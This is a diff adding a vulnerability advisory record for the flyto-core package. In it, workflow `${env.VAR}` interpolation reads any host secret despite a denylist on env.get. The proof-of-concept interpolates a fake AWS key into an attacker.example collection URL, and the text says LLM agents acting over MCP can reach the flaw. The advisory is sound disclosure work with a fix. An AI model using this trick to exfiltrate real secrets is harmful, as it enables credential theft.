@@ -1,0 +1,331 @@
+advisory_id: GHSA-hr7p-wg7r-hg9m
+datasource_id: github_osv/GHSA-hr7p-wg7r-hg9m
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-hr7p-wg7r-hg9m/GHSA-hr7p-wg7r-hg9m.json
+aliases:
+  - CVE-2026-67427
+summary: |
+  Flyto2 Core: ${env.VAR} interpolation reads any env secret despite env.get being denylisted
+  ## Summary
+
+  The capability policy denies the `env.get` and `env.load_dotenv` modules by default, with the stated reason that they read arbitrary host environment variables (API keys, DSNs) and are a secret-exfil risk. But the workflow engine's variable resolver expands `${env.VAR}` for any environment variable with no allowlist and no policy check, so the exact capability the denylist blocks is available to any workflow parameter. The resolved secret can then be sent out through any allowed module.
+
+  ## Affected code
+
+  `src/core/engine/variable_resolver.py`:
+
+  ```python
+  if var_type == 'env':
+      if len(parts) < 2:
+          return None
+      env_var = parts[1]
+      return os.getenv(env_var)      # any env var, no allowlist, not covered by module policy
+  ```
+
+  The module policy (`enforce_module_policy` in `module_policy.py`) gates module execution at `BaseModule.run`, but `${...}` interpolation happens earlier in the engine and is not subject to it. So denylisting `env.get` does not actually stop a workflow from reading host env secrets.
+
+  ## Reproduction
+
+  Save as `envbypass_poc.py`, run with `PYTHONPATH=src/src python envbypass_poc.py`.
+
+  ```python
+  #!/usr/bin/env python3
+  import os
+  os.environ["AWS_SECRET_ACCESS_KEY"] = "AKIA-operator-super-secret-DO-NOT-LEAK"
+
+  from core.module_policy import module_filter
+  from core.engine.variable_resolver import VariableResolver
+
+  print("env.get allowed?       ", module_filter.is_allowed("env.get"))
+  r = VariableResolver(params={}, context={})
+  print("resolve ${env.SECRET}: ", r.resolve("${env.AWS_SECRET_ACCESS_KEY}"))
+  print("into an attacker URL:  ", r.resolve("https://attacker.example/collect?k=${env.AWS_SECRET_ACCESS_KEY}"))
+  ```
+
+  Output:
+
+  ```
+  env.get allowed?        False
+  resolve ${env.SECRET}:  AKIA-operator-super-secret-DO-NOT-LEAK
+  into an attacker URL:   https://attacker.example/collect?k=AKIA-operator-super-secret-DO-NOT-LEAK
+  ```
+
+  `env.get` is denied, yet `${env.AWS_SECRET_ACCESS_KEY}` reads the same secret and drops it straight into a URL. Confirmed through the running API too: a `POST /v1/workflow/run` step with `text: "${env.AWS_SECRET_ACCESS_KEY}"` resolved to the secret and returned it in the workflow result (in plaintext — the trace redaction did not mask it).
+
+  ## Reachability (why this is not operator self-service)
+
+  The vendor denies `env.get` by default and states the reason inline — reading arbitrary host env vars is a secret-exfil risk. That default only makes sense against an untrusted workflow/agent, which is precisely the caller here: workflow parameters and step values come from the LLM through the MCP tool surface or from a hosted-API client, not from the trusted operator. `${env.*}` gives that same denied capability with no gate, so it is a direct bypass of a control the vendor deliberately turned on — not intended behavior.
+
+  ## Impact
+
+  Read any host environment variable — cloud keys, tokens, DSNs — that the operator relied on the `env.get` denylist to protect, and exfiltrate it by interpolating it into an outbound request handled by an allowed module (the SSRF guard allows the attacker's public host). Reachable via the workflow API and the MCP agent surface.
+
+  ## Suggested fix
+
+  Apply the same policy to `${env.*}` as to the `env.get` module: gate it behind an explicit allowlist of permitted variable names and deny by default when `env.get` is denied, so engine interpolation and module execution enforce one env-access policy. Alternatively drop `${env.*}` and require env values to be passed in explicitly at workflow start.
+impacted_packages:
+  - purl: pkg:pypi/flyto-core
+    affected_versions: vers:pypi/<2.26.7
+    fixed_versions: vers:pypi/2.26.7
+    affected_packages:
+      - pkg:pypi/flyto-core@1.0.0
+      - pkg:pypi/flyto-core@1.0.1
+      - pkg:pypi/flyto-core@1.0.2
+      - pkg:pypi/flyto-core@1.0.3
+      - pkg:pypi/flyto-core@1.0.4
+      - pkg:pypi/flyto-core@1.0.5
+      - pkg:pypi/flyto-core@1.0.6
+      - pkg:pypi/flyto-core@1.0.7
+      - pkg:pypi/flyto-core@1.0.8
+      - pkg:pypi/flyto-core@1.0.9
+      - pkg:pypi/flyto-core@1.1.0
+      - pkg:pypi/flyto-core@1.1.1
+      - pkg:pypi/flyto-core@1.2.0
+      - pkg:pypi/flyto-core@1.3.0
+      - pkg:pypi/flyto-core@1.4.0
+      - pkg:pypi/flyto-core@1.5.0
+      - pkg:pypi/flyto-core@1.5.1
+      - pkg:pypi/flyto-core@1.5.2
+      - pkg:pypi/flyto-core@1.5.4
+      - pkg:pypi/flyto-core@1.6.0
+      - pkg:pypi/flyto-core@1.6.1
+      - pkg:pypi/flyto-core@1.6.2
+      - pkg:pypi/flyto-core@1.6.3
+      - pkg:pypi/flyto-core@1.6.4
+      - pkg:pypi/flyto-core@1.6.5
+      - pkg:pypi/flyto-core@1.7.0
+      - pkg:pypi/flyto-core@1.7.1
+      - pkg:pypi/flyto-core@1.7.2
+      - pkg:pypi/flyto-core@1.7.3
+      - pkg:pypi/flyto-core@1.7.4
+      - pkg:pypi/flyto-core@1.7.5
+      - pkg:pypi/flyto-core@1.7.6
+      - pkg:pypi/flyto-core@1.7.7
+      - pkg:pypi/flyto-core@1.7.8
+      - pkg:pypi/flyto-core@1.7.9
+      - pkg:pypi/flyto-core@1.8.0
+      - pkg:pypi/flyto-core@1.8.1
+      - pkg:pypi/flyto-core@1.8.2
+      - pkg:pypi/flyto-core@1.8.3
+      - pkg:pypi/flyto-core@1.8.4
+      - pkg:pypi/flyto-core@1.8.5
+      - pkg:pypi/flyto-core@1.8.6
+      - pkg:pypi/flyto-core@1.8.7
+      - pkg:pypi/flyto-core@1.8.8
+      - pkg:pypi/flyto-core@1.8.9
+      - pkg:pypi/flyto-core@1.8.10
+      - pkg:pypi/flyto-core@1.8.11
+      - pkg:pypi/flyto-core@1.8.12
+      - pkg:pypi/flyto-core@1.8.13
+      - pkg:pypi/flyto-core@1.8.14
+      - pkg:pypi/flyto-core@1.8.15
+      - pkg:pypi/flyto-core@1.8.16
+      - pkg:pypi/flyto-core@1.8.17
+      - pkg:pypi/flyto-core@1.9.0
+      - pkg:pypi/flyto-core@1.11.0
+      - pkg:pypi/flyto-core@1.12.0
+      - pkg:pypi/flyto-core@1.13.0
+      - pkg:pypi/flyto-core@1.14.0
+      - pkg:pypi/flyto-core@1.14.1
+      - pkg:pypi/flyto-core@1.14.2
+      - pkg:pypi/flyto-core@1.15.0
+      - pkg:pypi/flyto-core@1.16.0
+      - pkg:pypi/flyto-core@1.16.1
+      - pkg:pypi/flyto-core@1.16.2
+      - pkg:pypi/flyto-core@1.16.3
+      - pkg:pypi/flyto-core@1.16.4
+      - pkg:pypi/flyto-core@1.16.5
+      - pkg:pypi/flyto-core@1.16.6
+      - pkg:pypi/flyto-core@1.16.7
+      - pkg:pypi/flyto-core@1.16.8
+      - pkg:pypi/flyto-core@1.16.9
+      - pkg:pypi/flyto-core@1.16.10
+      - pkg:pypi/flyto-core@2.0.0
+      - pkg:pypi/flyto-core@2.0.1
+      - pkg:pypi/flyto-core@2.0.2
+      - pkg:pypi/flyto-core@2.0.3
+      - pkg:pypi/flyto-core@2.0.4
+      - pkg:pypi/flyto-core@2.0.5
+      - pkg:pypi/flyto-core@2.1.0
+      - pkg:pypi/flyto-core@2.1.1
+      - pkg:pypi/flyto-core@2.1.2
+      - pkg:pypi/flyto-core@2.1.3
+      - pkg:pypi/flyto-core@2.1.4
+      - pkg:pypi/flyto-core@2.2.0
+      - pkg:pypi/flyto-core@2.2.1
+      - pkg:pypi/flyto-core@2.2.2
+      - pkg:pypi/flyto-core@2.3.0
+      - pkg:pypi/flyto-core@2.3.1
+      - pkg:pypi/flyto-core@2.4.0
+      - pkg:pypi/flyto-core@2.4.1
+      - pkg:pypi/flyto-core@2.4.2
+      - pkg:pypi/flyto-core@2.4.3
+      - pkg:pypi/flyto-core@2.4.4
+      - pkg:pypi/flyto-core@2.4.5
+      - pkg:pypi/flyto-core@2.4.6
+      - pkg:pypi/flyto-core@2.4.7
+      - pkg:pypi/flyto-core@2.5.0
+      - pkg:pypi/flyto-core@2.5.1
+      - pkg:pypi/flyto-core@2.5.2
+      - pkg:pypi/flyto-core@2.6.0
+      - pkg:pypi/flyto-core@2.6.1
+      - pkg:pypi/flyto-core@2.7.0
+      - pkg:pypi/flyto-core@2.7.1
+      - pkg:pypi/flyto-core@2.7.2
+      - pkg:pypi/flyto-core@2.7.3
+      - pkg:pypi/flyto-core@2.7.4
+      - pkg:pypi/flyto-core@2.7.5
+      - pkg:pypi/flyto-core@2.7.6
+      - pkg:pypi/flyto-core@2.8.0
+      - pkg:pypi/flyto-core@2.9.0
+      - pkg:pypi/flyto-core@2.10.0
+      - pkg:pypi/flyto-core@2.11.0
+      - pkg:pypi/flyto-core@2.12.0
+      - pkg:pypi/flyto-core@2.12.1
+      - pkg:pypi/flyto-core@2.12.2
+      - pkg:pypi/flyto-core@2.12.3
+      - pkg:pypi/flyto-core@2.12.4
+      - pkg:pypi/flyto-core@2.12.5
+      - pkg:pypi/flyto-core@2.12.6
+      - pkg:pypi/flyto-core@2.12.13
+      - pkg:pypi/flyto-core@2.12.15
+      - pkg:pypi/flyto-core@2.12.16
+      - pkg:pypi/flyto-core@2.12.17
+      - pkg:pypi/flyto-core@2.12.18
+      - pkg:pypi/flyto-core@2.12.19
+      - pkg:pypi/flyto-core@2.12.20
+      - pkg:pypi/flyto-core@2.12.21
+      - pkg:pypi/flyto-core@2.12.22
+      - pkg:pypi/flyto-core@2.12.23
+      - pkg:pypi/flyto-core@2.12.24
+      - pkg:pypi/flyto-core@2.12.25
+      - pkg:pypi/flyto-core@2.12.26
+      - pkg:pypi/flyto-core@2.12.27
+      - pkg:pypi/flyto-core@2.12.28
+      - pkg:pypi/flyto-core@2.13.0
+      - pkg:pypi/flyto-core@2.13.1
+      - pkg:pypi/flyto-core@2.13.2
+      - pkg:pypi/flyto-core@2.13.3
+      - pkg:pypi/flyto-core@2.13.4
+      - pkg:pypi/flyto-core@2.14.0
+      - pkg:pypi/flyto-core@2.15.0
+      - pkg:pypi/flyto-core@2.15.1
+      - pkg:pypi/flyto-core@2.15.2
+      - pkg:pypi/flyto-core@2.15.3
+      - pkg:pypi/flyto-core@2.16.1
+      - pkg:pypi/flyto-core@2.16.3
+      - pkg:pypi/flyto-core@2.16.4
+      - pkg:pypi/flyto-core@2.17.0
+      - pkg:pypi/flyto-core@2.17.1
+      - pkg:pypi/flyto-core@2.17.2
+      - pkg:pypi/flyto-core@2.17.3
+      - pkg:pypi/flyto-core@2.17.4
+      - pkg:pypi/flyto-core@2.17.5
+      - pkg:pypi/flyto-core@2.17.6
+      - pkg:pypi/flyto-core@2.17.7
+      - pkg:pypi/flyto-core@2.17.8
+      - pkg:pypi/flyto-core@2.18.0
+      - pkg:pypi/flyto-core@2.18.1
+      - pkg:pypi/flyto-core@2.18.2
+      - pkg:pypi/flyto-core@2.18.3
+      - pkg:pypi/flyto-core@2.18.4
+      - pkg:pypi/flyto-core@2.18.5
+      - pkg:pypi/flyto-core@2.18.6
+      - pkg:pypi/flyto-core@2.18.8
+      - pkg:pypi/flyto-core@2.18.9
+      - pkg:pypi/flyto-core@2.18.10
+      - pkg:pypi/flyto-core@2.18.11
+      - pkg:pypi/flyto-core@2.19.0
+      - pkg:pypi/flyto-core@2.20.0
+      - pkg:pypi/flyto-core@2.20.1
+      - pkg:pypi/flyto-core@2.20.2
+      - pkg:pypi/flyto-core@2.20.3
+      - pkg:pypi/flyto-core@2.20.4
+      - pkg:pypi/flyto-core@2.23.0
+      - pkg:pypi/flyto-core@2.23.1
+      - pkg:pypi/flyto-core@2.23.2
+      - pkg:pypi/flyto-core@2.23.3
+      - pkg:pypi/flyto-core@2.24.0
+      - pkg:pypi/flyto-core@2.24.1
+      - pkg:pypi/flyto-core@2.24.2
+      - pkg:pypi/flyto-core@2.24.3
+      - pkg:pypi/flyto-core@2.24.4
+      - pkg:pypi/flyto-core@2.25.0
+      - pkg:pypi/flyto-core@2.25.1
+      - pkg:pypi/flyto-core@2.25.2
+      - pkg:pypi/flyto-core@2.25.3
+      - pkg:pypi/flyto-core@2.25.4
+      - pkg:pypi/flyto-core@2.25.5
+      - pkg:pypi/flyto-core@2.25.6
+      - pkg:pypi/flyto-core@2.25.7
+      - pkg:pypi/flyto-core@2.25.8
+      - pkg:pypi/flyto-core@2.25.9
+      - pkg:pypi/flyto-core@2.25.10
+      - pkg:pypi/flyto-core@2.25.11
+      - pkg:pypi/flyto-core@2.25.12
+      - pkg:pypi/flyto-core@2.25.13
+      - pkg:pypi/flyto-core@2.25.14
+      - pkg:pypi/flyto-core@2.25.15
+      - pkg:pypi/flyto-core@2.25.16
+      - pkg:pypi/flyto-core@2.25.17
+      - pkg:pypi/flyto-core@2.25.18
+      - pkg:pypi/flyto-core@2.25.19
+      - pkg:pypi/flyto-core@2.25.20
+      - pkg:pypi/flyto-core@2.25.21
+      - pkg:pypi/flyto-core@2.25.22
+      - pkg:pypi/flyto-core@2.25.23
+      - pkg:pypi/flyto-core@2.25.24
+      - pkg:pypi/flyto-core@2.25.25
+      - pkg:pypi/flyto-core@2.25.26
+      - pkg:pypi/flyto-core@2.25.27
+      - pkg:pypi/flyto-core@2.26.0
+      - pkg:pypi/flyto-core@2.26.1
+      - pkg:pypi/flyto-core@2.26.2
+      - pkg:pypi/flyto-core@2.26.3
+      - pkg:pypi/flyto-core@2.26.4
+      - pkg:pypi/flyto-core@2.26.5
+    fixed_packages:
+      - pkg:pypi/flyto-core@2.26.7
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/flytohub/flyto-core
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/flytohub/flyto-core
+        commit: d5f89d71303e3c1e6418d347c5c55fcd173cc8cc
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '8.6'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-hr7p-wg7r-hg9m/GHSA-hr7p-wg7r-hg9m.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-693
+  - CWE-522
+  - CWE-668
+references:
+  - url: https://github.com/flytohub/flyto-core
+    reference_type:
+    reference_id:
+  - url: https://github.com/flytohub/flyto-core/commit/d5f89d71303e3c1e6418d347c5c55fcd173cc8cc
+    reference_type:
+    reference_id:
+  - url: https://github.com/flytohub/flyto-core/releases/tag/v2.26.6
+    reference_type:
+    reference_id:
+  - url: https://github.com/flytohub/flyto-core/security/advisories/GHSA-hr7p-wg7r-hg9m
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-67427
+    reference_type:
+    reference_id: CVE-2026-67427
+exploits: []
